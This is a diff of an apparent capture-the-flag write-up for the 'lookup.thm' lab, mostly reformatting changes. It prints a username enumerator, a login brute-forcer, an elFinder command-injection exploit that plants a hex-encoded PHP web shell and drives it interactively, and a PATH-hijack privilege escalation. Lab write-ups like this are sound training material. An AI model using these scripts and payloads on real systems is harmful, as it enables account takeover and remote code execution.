@@ -7,8 +7,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
+| 22 | ssh |
+| 80 | http |
 
 Let's visit the website:
 
@@ -65,90 +65,90 @@ invalid_usernames = []
 # Creating the function to check for usernames:
 
 def check_username(url, username):
-    # Setting up the invalid error we got from reading the burp request
-    invalid_errors = [
-        "Wrong username or password. Please try again."
-    ]
-    # Setting up the headers we got in the burp request
-    headers = {
-        'Host': 'lookup.thm',
-        'User-Agent': 'Intigriti',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,'
-                  'image/svg+xml,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'http://lookup.thm',
-        'Connection': 'keep-alive',
-        'Referer': 'http://lookup.thm/login.php',
-        'Upgrade-Insecure-Requests': '1',
-        'Priority': 'u=0, i',
-    }
-    # Creating the dictionary with our data
-    data = {
-        'username': username,
-        'password': 'test',
-        'function': 'login'
-    }
-    try:
-        # Sending the request and reading the status code
-        response = requests.post(url, headers=headers, data=data, allow_redirects=True)
-        if response.status_code != 200:
-            return sys.exit(1)
-        # If there's no errors in the response text, we can append the username to the empty list we set up before
-        if not any(error in response.text for error in invalid_errors):
-            with lock:
-                print(f'[+] Got valid username: {username}')
-                valid_usernames.append(username)
-        # Else, we append to invalid usernames list
-        else:
-            with lock:
-                invalid_usernames.append(username)
-    except requests.RequestException as e:
-        print(f'[-] Error: {e}')
+ # Setting up the invalid error we got from reading the burp request
+ invalid_errors = [
+ "Wrong username or password. Please try again."
+ ]
+ # Setting up the headers we got in the burp request
+ headers = {
+ 'Host': 'lookup.thm',
+ 'User-Agent': 'Intigriti',
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,'
+ 'image/svg+xml,*/*;q=0.8',
+ 'Accept-Language': 'en-US,en;q=0.5',
+ 'Accept-Encoding': 'gzip, deflate, br',
+ 'Content-Type': 'application/x-www-form-urlencoded',
+ 'Origin': 'http://lookup.thm',
+ 'Connection': 'keep-alive',
+ 'Referer': 'http://lookup.thm/login.php',
+ 'Upgrade-Insecure-Requests': '1',
+ 'Priority': 'u=0, i',
+ }
+ # Creating the dictionary with our data
+ data = {
+ 'username': username,
+ 'password': 'test',
+ 'function': 'login'
+ }
+ try:
+ # Sending the request and reading the status code
+ response = requests.post(url, headers=headers, data=data, allow_redirects=True)
+ if response.status_code != 200:
+ return sys.exit(1)
+ # If there's no errors in the response text, we can append the username to the empty list we set up before
+ if not any(error in response.text for error in invalid_errors):
+ with lock:
+ print(f'[+] Got valid username: {username}')
+ valid_usernames.append(username)
+ # Else, we append to invalid usernames list
+ else:
+ with lock:
+ invalid_usernames.append(username)
+ except requests.RequestException as e:
+ print(f'[-] Error: {e}')
 
 
 # Enumerating the usernames
 
 def enumerate_usernames(wordlist):
-    threads = []
-    # We are opening the wordlist file and reading it, separating each line, so it can test for each username
-    with open(wordlist, 'r') as f:
-        usernames = f.readlines()
-    try:
-        # Next, create a progress bar using the tqdm library, also, creating a thread to speed up the process
-        for username in tqdm(usernames, desc=f'Bruteforcing... ', unit=" usernames"):
-            username = username.strip()
-            if username:
-                thread = threading.Thread(target=check_username, args=(url, username))
-                threads.append(thread)
-                thread.start()
+ threads = []
+ # We are opening the wordlist file and reading it, separating each line, so it can test for each username
+ with open(wordlist, 'r') as f:
+ usernames = f.readlines()
+ try:
+ # Next, create a progress bar using the tqdm library, also, creating a thread to speed up the process
+ for username in tqdm(usernames, desc=f'Bruteforcing... ', unit=" usernames"):
+ username = username.strip()
+ if username:
+ thread = threading.Thread(target=check_username, args=(url, username))
+ threads.append(thread)
+ thread.start()
 
-                if len(threads) >= THREAD_COUNT:
-                    for t in threads:
-                        t.join()
-                    threads = []
-            for t in threads:
-                t.join()
+ if len(threads) >= THREAD_COUNT:
+ for t in threads:
+ t.join()
+ threads = []
+ for t in threads:
+ t.join()
 
-    except KeyboardInterrupt:
-        print('\n Exiting program..')
-        sys.exit(0)
+ except KeyboardInterrupt:
+ print('\n Exiting program..')
+ sys.exit(0)
 
 
 # Setting up final things to be able to execute the script properly
 if __name__ == '__main__':
-    if len(sys.argv) != 4:
-        print('Usage: python3 lookup_bruteforce.py <URl> <WORDLIST> <THREADS>')
-        sys.exit(1)
+ if len(sys.argv) != 4:
+ print('Usage: python3 lookup_bruteforce.py <URl> <WORDLIST> <THREADS>')
+ sys.exit(1)
 
-    url = sys.argv[1]
-    wordlist = sys.argv[2]
-    THREAD_COUNT = int(sys.argv[3])
-    enumerate_usernames(wordlist)
-    print(f"[+] The total of invalid usernames are: {len(invalid_usernames)}")
-    print(f"[+] The total of valid usernames are: {len(valid_usernames)}")
-    print(f"\n[+] These are the valid usernames: {valid_usernames}")
+ url = sys.argv[1]
+ wordlist = sys.argv[2]
+ THREAD_COUNT = int(sys.argv[3])
+ enumerate_usernames(wordlist)
+ print(f"[+] The total of invalid usernames are: {len(invalid_usernames)}")
+ print(f"[+] The total of valid usernames are: {len(valid_usernames)}")
+ print(f"\n[+] These are the valid usernames: {valid_usernames}")
 ```
 
 With the following python code, we can brute force the usernames, this may take some time, so, we can also use the hydra way
@@ -193,82 +193,82 @@ lock = threading.Lock()
 
 
 def check_user_password(url, user, password):
-    invalid_errors = [
-        "Wrong password. Please try again.",
-        "Wrong username or password. Please try again."
-    ]
-    headers = {
-        'Host': 'lookup.thm',
-        'User-Agent': 'Intigriti',
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,'
-				  'image/svg+xml,*/*;q=0.8',
-        'Accept-Language': 'en-US,en;q=0.5',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'http://lookup.thm/',
-        'Connection': 'keep-alive',
-        'Referer': 'http://lookup.thm/login.php',
-        'Upgrade-Insecure-Requests': '1',
-        'Priority': 'u=0, i',
-    }
+ invalid_errors = [
+ "Wrong password. Please try again.",
+ "Wrong username or password. Please try again."
+ ]
+ headers = {
+ 'Host': 'lookup.thm',
+ 'User-Agent': 'Intigriti',
+ 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,'
+				 'image/svg+xml,*/*;q=0.8',
+ 'Accept-Language': 'en-US,en;q=0.5',
+ 'Accept-Encoding': 'gzip, deflate, br',
+ 'Content-Type': 'application/x-www-form-urlencoded',
+ 'Origin': 'http://lookup.thm/',
+ 'Connection': 'keep-alive',
+ 'Referer': 'http://lookup.thm/login.php',
+ 'Upgrade-Insecure-Requests': '1',
+ 'Priority': 'u=0, i',
+ }
 
-    data = {
-        'username': user,
-        'password': password
-    }
+ data = {
+ 'username': user,
+ 'password': password
+ }
 
-    try:
-        response = requests.post(url, headers=headers, data=data, allow_redirects=True)
-        if not any(error in response.text for error in invalid_errors):
-            with lock:
-                print(f"Got VALID password: {password}")
-                valid_passwords.append(password)
-        else:
-            invalid_passwords.append(password)
+ try:
+ response = requests.post(url, headers=headers, data=data, allow_redirects=True)
+ if not any(error in response.text for error in invalid_errors):
+ with lock:
+ print(f"Got VALID password: {password}")
+ valid_passwords.append(password)
+ else:
+ invalid_passwords.append(password)
 
-    except requests.RequestException as e:
-        valid_passwords.append(password)
-        print(f"Error checking password for {user} and {password}")
+ except requests.RequestException as e:
+ valid_passwords.append(password)
+ print(f"Error checking password for {user} and {password}")
 
 
 def enumerate_admin_password(WORDLIST):
-    threads = []
-    with open(WORDLIST, 'r', encoding='latin-1') as f:
-        passwords = f.readlines()
-    try:
-        for password in tqdm(passwords, desc=f"Bruteforcing...{user}", unit=" passwords"):
-            password = password.strip()  # Remove any leading/trailing whitespace
-            if password:
-                thread = threading.Thread(target=check_user_password, args=(url, user, password))
-                threads.append(thread)
-                thread.start()
+ threads = []
+ with open(WORDLIST, 'r', encoding='latin-1') as f:
+ passwords = f.readlines()
+ try:
+ for password in tqdm(passwords, desc=f"Bruteforcing...{user}", unit=" passwords"):
+ password = password.strip() # Remove any leading/trailing whitespace
+ if password:
+ thread = threading.Thread(target=check_user_password, args=(url, user, password))
+ threads.append(thread)
+ thread.start()
 
-                if len(threads) >= THREAD_COUNT:
-                    for t in threads:
-                        t.join()
-                    threads = []
+ if len(threads) >= THREAD_COUNT:
+ for t in threads:
+ t.join()
+ threads = []
 
-        for t in threads:
-            t.join()
+ for t in threads:
+ t.join()
 
-    except KeyboardInterrupt:
-        print("\nExiting program...")
-        sys.exit(0)
+ except KeyboardInterrupt:
+ print("\nExiting program...")
+ sys.exit(0)
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 5:
-        print("Usage: python3 script.py <URL> <USER> <WORDLIST> <THREADS>")
-        sys.exit(1)
+ if len(sys.argv) != 5:
+ print("Usage: python3 script.py <URL> <USER> <WORDLIST> <THREADS>")
+ sys.exit(1)
 
-    url = sys.argv[1]
-    user = sys.argv[2].strip()
-    WORDLIST = sys.argv[3]
-    THREAD_COUNT = int(sys.argv[4].strip())
-    enumerate_admin_password(WORDLIST)
-    print(f"The total of invalid passwords for user {user} are: {len(invalid_passwords)}")
-    print(f"The total of valid passwords for user {user} are: {len(valid_passwords)}")
-    print(f"\nThese are the valid password for user {user}: {valid_passwords}")
+ url = sys.argv[1]
+ user = sys.argv[2].strip()
+ WORDLIST = sys.argv[3]
+ THREAD_COUNT = int(sys.argv[4].strip())
+ enumerate_admin_password(WORDLIST)
+ print(f"The total of invalid passwords for user {user} are: {len(invalid_passwords)}")
+ print(f"The total of valid passwords for user {user} are: {len(valid_passwords)}")
+ print(f"\nThese are the valid password for user {user}: {valid_passwords}")
 
 ```
 
@@ -308,52 +308,52 @@ import sys
 
 
 def upload(url, payload):
-    files = {'upload[]': (payload, open('image_input.jpg', 'rb'))}
-    data = {"reqid": "1693222c439f4", "cmd": "upload", "target": "l1_Lw", "mtime[]": "1497726174"}
-    r = requests.post(f"{url}/php/connector.minimal.php", files=files, data=data)
-    j = json.loads(r.text)
-    return j['added'][0]['hash']
+ files = {'upload[]': (payload, open('image_input.jpg', 'rb'))}
+ data = {"reqid": "1693222c439f4", "cmd": "upload", "target": "l1_Lw", "mtime[]": "1497726174"}
+ r = requests.post(f"{url}/php/connector.minimal.php", files=files, data=data)
+ j = json.loads(r.text)
+ return j['added'][0]['hash']
 
 def imgRotate(url, hash):
-    r = requests.get(f"{url}/php/connector.minimal.php?target={hash}&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c")
-    return r.text
+ r = requests.get(f"{url}/php/connector.minimal.php?target={hash}&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c")
+ return r.text
 
 def shell(url):
-    r = requests.get(f"{url}/php/image_input.php")
-    if r.status_code == 200:
-        print("[+] We're in :)")
-        print("[+] Spawning a shell")
-        while True:
-            try:
-                input_command = input("$ ")
-                r = requests.get(f"{url}/php/image_input.php?c={input_command}")
-                print(r.text)
-                if input_command.strip() == "exit":
-                    print("\nExiting.....")
-                    sys.exit(0)
-            except KeyboardInterrupt:
-                sys.exit("\nSo long brother....")
-    else:
-        print("[*] Cannot reliably check exploitability T_T.")
+ r = requests.get(f"{url}/php/image_input.php")
+ if r.status_code == 200:
+ print("[+] We're in :)")
+ print("[+] Spawning a shell")
+ while True:
+ try:
+ input_command = input("$ ")
+ r = requests.get(f"{url}/php/image_input.php?c={input_command}")
+ print(r.text)
+ if input_command.strip() == "exit":
+ print("\nExiting.....")
+ sys.exit(0)
+ except KeyboardInterrupt:
+ sys.exit("\nSo long brother....")
+ else:
+ print("[*] Cannot reliably check exploitability T_T.")
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python exploit.py http://IP:PORT/elFinder/ [IMAGE FILE]")
-        print("""Note: 
-              1. Copy or make an image file in the current working directory.
-              2. Ensure that 'image_input.jpg' is literal file name for the image file.
-              3. Ensure the image file is present in the current working directory. :)""")
-        sys.exit(0)
+ if len(sys.argv) != 3:
+ print("Usage: python exploit.py http://IP:PORT/elFinder/ [IMAGE FILE]")
+ print("""Note: 
+ 1. Copy or make an image file in the current working directory.
+ 2. Ensure that 'image_input.jpg' is literal file name for the image file.
+ 3. Ensure the image file is present in the current working directory. :)""")
+ sys.exit(0)
 
-    url = sys.argv[1]
-    payload = "image_input.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > image_input.php;echo image_input.jpg"
+ url = sys.argv[1]
+ payload = "image_input.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > image_input.php;echo image_input.jpg"
 
-    print("[*] Uploading sus image...")
-    hash = upload(url, payload)
-    print("[*] Executing the payload...")
-    imgRotate(url, hash)
-    shell(url)
+ print("[*] Uploading sus image...")
+ hash = upload(url, payload)
+ print("[*] Executing the payload...")
+ imgRotate(url, hash)
+ shell(url)
 ```
 
 We can either run this code or use the Metasploit exploit located at: `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`
@@ -377,44 +377,44 @@ First, we know that when we execute `id` we get this:
 
 If we read the strings from our file, we see this:
 
-We can see that it usesÂ `id`Â command then it uses this regexÂ `uid=%*u(%[^)])`Â to get the username part inÂ `uid`Â . We can also see here that it appends the username betweenÂ `/home/<username>/.passwords`Â and getting thatÂ `.passwords`Â file from that directory
+We can see that it uses`id` command then it uses this regex`uid=%*u(%[^)])` to get the username part in`uid` . We can also see here that it appends the username between`/home/<username>/.passwords` and getting that`.passwords` file from that directory
 
-Peeking at the home directory of userÂ `think`Â , we can see that he have that password file but we have no read permission to it.
+Peeking at the home directory of user`think` , we can see that he have that password file but we have no read permission to it.
 
 So, we got the following observations: 
 
 1. SetUID and SetGID Binary (`/usr/sbin/pwm`):
 
 - This means that the binary runs with elevated privileges.
-- It executes theÂ `id`Â command to extract the current user and then tries to access aÂ `.passwords`Â file in that userâ€™s home directory.
+- It executes the`id` command to extract the current user and then tries to access a`.passwords` file in that userâ€™s home directory.
 
-2.Â `.passwords`Â File:
+2.`.passwords` File:
 
-- Located atÂ `/home/think/.passwords`.
-- Permissions:Â Only accessible byÂ `root`Â and theÂ `think`Â user.
-- Goal: We need to trick the binary into readingÂ `.passwords`
+- Located at`/home/think/.passwords`.
+- Permissions: Only accessible by`root` and the`think` user.
+- Goal: We need to trick the binary into reading`.passwords`
 
 So, in order to exploit that, we need to reproduce the following steps:
 
 
-1. Modify theÂ `$PATH`Â Variable:
+1. Modify the`$PATH` Variable:
 
-- First, use theÂ `id`Â command to generate an output and replace the username with usernameÂ `think`Â ,Â we can useÂ `echo`Â command to replicate this:
+- First, use the`id` command to generate an output and replace the username with username`think` , we can use`echo` command to replicate this:
 
 `echo "uid=33(think) gid=33(think) groups=33(think)"`
 
-- Create a maliciousÂ `id`Â binary in a directory you control (e.g.,Â `/dev/shm`)
+- Create a malicious`id` binary in a directory you control (e.g.,`/dev/shm`)
 
 $ `c ` 
-$ `echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /dev/shm/id` # echoe's a uid in the context of user "think"  
+$ `echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /dev/shm/id` # echoe's a uid in the context of user "think" 
 $ `chmod +x /dev/shm/id`
 
-- AdjustÂ `$PATH`Â to include this directoryÂ `/dev/shm`Â at the beginning so that the OS will be tricked that the binaryÂ `id`Â is coming fromÂ `/dev/shm`Â :
+- Adjust`$PATH` to include this directory`/dev/shm` at the beginning so that the OS will be tricked that the binary`id` is coming from`/dev/shm` :
 
 `export PATH=/dev/shm:$PATH`
 `echo $PATH`
 
-Now thatÂ `/dev/shm`Â is in theÂ **PATH**Â variable, we can now execute the binary:
+Now that`/dev/shm` is in the **PATH** variable, we can now execute the binary:
 
 
 We can use these passwords to bruteforce `think` ssh:
